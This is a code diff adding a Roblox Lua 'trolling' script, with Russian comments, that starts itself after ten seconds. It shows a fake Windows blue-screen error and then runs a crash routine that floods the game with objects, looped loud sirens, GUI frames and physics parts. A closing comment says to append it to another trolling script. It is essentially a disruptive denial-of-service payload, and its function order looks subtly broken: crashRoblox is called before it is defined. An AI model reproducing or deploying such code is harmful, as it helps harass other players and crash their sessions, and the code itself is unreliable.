@@ -1,1 +1,250 @@
+-- ██████ СИНИЙ ЭКРАН СМЕРТИ WINDOWS В ROBLOX ██████
+local function blueScreenOfDeath()
+    -- Создаем полноэкранный синий фон
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "BlueScreenOfDeath"
+    gui.Parent = game:GetService("CoreGui")
+    gui.ResetOnSpawn = false
 
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.fromRGB(0, 0, 170)  -- Классический синий цвет BSOD
+    background.BorderSizePixel = 0
+    background.ZIndex = 99999
+    background.Parent = gui
+
+    -- Содержимое синего экрана
+    local content = Instance.new("Frame")
+    content.Size = UDim2.new(1, 0, 1, 0)
+    content.Position = UDim2.new(0, 0, 0, 0)
+    content.BackgroundTransparency = 1
+    content.ZIndex = 100000
+    content.Parent = gui
+
+    -- Иконка грустного смайлика
+    local emoji = Instance.new("TextLabel")
+    emoji.Text = "😢"
+    emoji.Size = UDim2.new(0, 100, 0, 100)
+    emoji.Position = UDim2.new(0, 50, 0, 50)
+    emoji.TextSize = 80
+    emoji.TextColor3 = Color3.new(1, 1, 1)
+    emoji.BackgroundTransparency = 1
+    emoji.ZIndex = 100001
+    emoji.Parent = content
+
+    -- Заголовок ошибки
+    local title = Instance.new("TextLabel")
+    title.Text = "CRITICAL_PROCESS_DIED"
+    title.Size = UDim2.new(1, -200, 0, 40)
+    title.Position = UDim2.new(0, 170, 0, 50)
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 24
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.BackgroundTransparency = 1
+    title.ZIndex = 100001
+    title.Parent = content
+
+    -- Описание ошибки
+    local description = Instance.new("TextLabel")
+    description.Text = "Your Roblox client ran into a problem and needs to restart.\nWe're just collecting some error info, and then we'll restart for you."
+    description.Size = UDim2.new(1, -200, 0, 60)
+    description.Position = UDim2.new(0, 170, 0, 90)
+    description.TextColor3 = Color3.new(1, 1, 1)
+    description.Font = Enum.Font.Gotham
+    description.TextSize = 18
+    description.TextXAlignment = Enum.TextXAlignment.Left
+    description.TextYAlignment = Enum.TextYAlignment.Top
+    description.BackgroundTransparency = 1
+    description.ZIndex = 100001
+    description.Parent = content
+
+    -- Код ошибки (случайный)
+    local errorCode = Instance.new("TextLabel")
+    errorCode.Text = "Stop code: CRITICAL_PROCESS_DIED\nError: 0x" .. string.format("%08X", math.random(0, 0xFFFFFFFF))
+    errorCode.Size = UDim2.new(1, -200, 0, 40)
+    errorCode.Position = UDim2.new(0, 170, 0, 160)
+    errorCode.TextColor3 = Color3.new(1, 1, 1)
+    errorCode.Font = Enum.Font.Gotham
+    errorCode.TextSize = 16
+    errorCode.TextXAlignment = Enum.TextXAlignment.Left
+    errorCode.BackgroundTransparency = 1
+    errorCode.ZIndex = 100001
+    errorCode.Parent = content
+
+    -- Прогресс бар
+    local progressFrame = Instance.new("Frame")
+    progressFrame.Size = UDim2.new(1, -200, 0, 20)
+    progressFrame.Position = UDim2.new(0, 170, 0, 210)
+    progressFrame.BackgroundColor3 = Color3.new(0.3, 0.3, 0.5)
+    progressFrame.BorderSizePixel = 0
+    progressFrame.ZIndex = 100001
+    progressFrame.Parent = content
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.new(1, 1, 1)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 100002
+    progressBar.Parent = progressFrame
+
+    -- QR код (фейковый)
+    local qrText = Instance.new("TextLabel")
+    qrText.Text = "For more information about this issue and possible fixes, visit https://www.roblox.com/support\n\nIf you call a support person, give them this info:\nStop code: CRITICAL_PROCESS_DIED"
+    qrText.Size = UDim2.new(1, -200, 0, 100)
+    qrText.Position = UDim2.new(0, 170, 0, 240)
+    qrText.TextColor3 = Color3.new(1, 1, 1)
+    qrText.Font = Enum.Font.Gotham
+    qrText.TextSize = 14
+    qrText.TextXAlignment = Enum.TextXAlignment.Left
+    qrText.TextYAlignment = Enum.TextYAlignment.Top
+    qrText.BackgroundTransparency = 1
+    qrText.ZIndex = 100001
+    qrText.Parent = content
+
+    -- Анимация прогресс бара
+    spawn(function()
+        for i = 0, 100, 2 do
+            progressBar.Size = UDim2.new(i/100, 0, 1, 0)
+            wait(0.1)
+        end
+        
+        -- После завершения прогресс бара запускаем краш
+        wait(2)
+        crashRoblox()
+    end)
+
+    return gui
+end
+
+-- ██████ ФУНКЦИЯ КРАША ROBLOX ██████
+local function crashRoblox()
+    print("💥 Запуск полного краша Roblox...")
+    
+    -- Метод 1: Бесконечная рекурсия с созданием объектов
+    local function createNestedModels(depth)
+        if depth > 1000 then return end
+        
+        local model = Instance.new("Model")
+        model.Name = "CrashModel_" .. depth
+        model.Parent = workspace
+        
+        for i = 1, 10 do
+            local part = Instance.new("Part")
+            part.Name = "CrashPart_" .. depth .. "_" .. i
+            part.Size = Vector3.new(10, 10, 10)
+            part.Position = Vector3.new(i * 5, depth * 2, 0)
+            part.Anchored = true
+            part.Parent = model
+            
+            -- Добавляем сложные свойства для перегрузки
+            for j = 1, 5 do
+                local value = Instance.new("StringValue")
+                value.Name = "CrashValue_" .. j
+                value.Value = string.rep("X", 1000)
+                value.Parent = part
+            end
+        end
+        
+        -- Рекурсивный вызов
+        spawn(function()
+            createNestedModels(depth + 1)
+        end)
+    end
+
+    -- Метод 2: Перегрузка звуковой системы
+    local function overloadAudio()
+        while true do
+            for i = 1, 50 do
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://107921759971053"  -- Ваш звук сирены
+                sound.Volume = 10
+                sound.Looped = true
+                sound.Parent = workspace
+                sound:Play()
+            end
+            wait(0.01)
+        end
+    end
+
+    -- Метод 3: Перегрузка интерфейса
+    local function overloadGUI()
+        while true do
+            local gui = Instance.new("ScreenGui")
+            gui.Parent = game:GetService("CoreGui")
+            
+            for i = 1, 100 do
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, math.random(-100,100), 1, math.random(-100,100))
+                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                frame.BackgroundTransparency = math.random()
+                frame.Parent = gui
+                
+                for j = 1, 10 do
+                    local label = Instance.new("TextLabel")
+                    label.Text = "CRASHING... " .. math.random(10000)
+                    label.Size = UDim2.new(1, 0, 1, 0)
+                    label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+                    label.BackgroundTransparency = 1
+                    label.Parent = frame
+                end
+            end
+            wait(0.01)
+        end
+    end
+
+    -- Метод 4: Физическая перегрузка
+    local function overloadPhysics()
+        game:GetService("Workspace").Gravity = 196.2 * 5  -- Увеличиваем гравитацию
+        
+        while true do
+            -- Создаем много физических объектов
+            for i = 1, 100 do
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(5, 5, 5)
+                part.Position = Vector3.new(math.random(-100,100), 50, math.random(-100,100))
+                part.Velocity = Vector3.new(math.random(-100,100), math.random(0,100), math.random(-100,100))
+                part.Parent = workspace
+            end
+            wait(0.01)
+        end
+    end
+
+    -- Запускаем все методы одновременно
+    spawn(function() createNestedModels(1) end)
+    spawn(overloadAudio)
+    spawn(overloadGUI)
+    spawn(overloadPhysics)
+    
+    -- Дополнительные методы краша
+    while true do
+        -- Меняем свойства среды
+        game:GetService("Lighting").TimeOfDay = tostring(math.random(0,24))
+        game:GetService("Lighting").Brightness = math.random(0, 10)
+        game:GetService("Lighting").GlobalShadows = math.random() > 0.5
+        
+        -- Лагим главный поток
+        for i = 1, 1000000 do end
+        
+        wait(0.1)
+    end
+end
+
+-- ██████ ФУНКЦИЯ ВЫЗОВА СИНЕГО ЭКРАНА ██████
+local function triggerBlueScreen()
+    -- Сначала показываем синий экран
+    local bsod = blueScreenOfDeath()
+    
+    -- Через несколько секунд запускаем краш
+    wait(5)
+    crashRoblox()
+end
+
+-- ██████ АВТОМАТИЧЕСКИЙ ЗАПУСК ██████
+-- Запускаем синий экран через 10 секунд после выполнения скрипта
+wait(10)
+triggerBlueScreen()
+
+-- ██████ ДОБАВЛЯЕМ ЭТОТ КОД В КОНЕЦ ТРОЛЛИНГ-СКРИПТА ██████
+-- После завершения троллинг-скрипта запустится синий экран и краш
